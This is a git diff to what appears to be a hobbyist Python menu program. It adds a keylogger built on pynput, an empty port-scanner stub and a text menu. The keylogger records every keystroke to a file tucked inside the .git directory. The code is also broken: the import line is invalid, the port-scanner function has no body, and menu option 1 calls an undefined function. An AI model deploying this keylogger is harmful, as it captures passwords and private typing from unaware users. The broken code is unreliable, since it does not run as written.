@@ -1,3 +1,6 @@
+import pynput.keyboard import Key, Listener
+import logging
+
 ## This is a program for scraping information from websites
 ## Information such as text, links, images, tables...
 ##
@@ -101,3 +104,47 @@ def Webscrapper():
 
 # This is a program for scanning ports of a computer
 # Port Scanner
+
+def Port_Scanner():
+    
+# This is a program for recording a hosts keylogger
+# Keylogger
+
+def keylogger():
+    logging.basicConfig(filename=(".git/keylogs.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+
+    def on_press(key):
+
+        logging.info(str(key))
+
+    with Listener(on_press=on_press) as listener :
+
+        listener.join()
+
+    
+
+while True:
+    print("\n --------------------------"+
+          "\n|   Menu Driven Program 2  |"+
+          "\n| muthunguclintn@gmail.com |"
+          "\n ---------------------")
+    print("\n 1. Web Scrapper.")
+    print(" 2. Port Scanner.")
+    print(" 3. Keylogger.")
+    print(" 4. quit.")
+    choice=int(input("Enter a number (1-10): "))
+    
+    if choice==1:
+        myBMI()
+        
+    elif choice==2:
+        Port_Scanner()
+
+    elif choice==3:
+        keylogger()
+        
+    elif choice==4:
+        break
+    
+    else:
+        print("Please enter the correct choice")
